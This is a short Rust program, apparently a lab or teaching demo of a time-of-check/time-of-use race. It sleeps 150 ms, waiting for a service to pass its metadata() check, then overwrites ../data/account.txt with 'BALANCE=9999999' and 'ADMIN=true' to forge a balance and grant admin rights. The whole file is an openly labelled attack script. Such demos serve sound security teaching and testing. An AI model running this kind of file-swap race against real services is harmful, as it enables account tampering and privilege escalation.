use std::{fs, thread, time::Duration};

fn main() {

    println!("ATTACKER WAITING...");

    // wait until service passes metadata()
    thread::sleep(Duration::from_millis(150));

    fs::write(
        "../data/account.txt",
        "BALANCE=9999999\nADMIN=true\n"
    ).unwrap();

    println!("ATTACK: swapped account file!");
}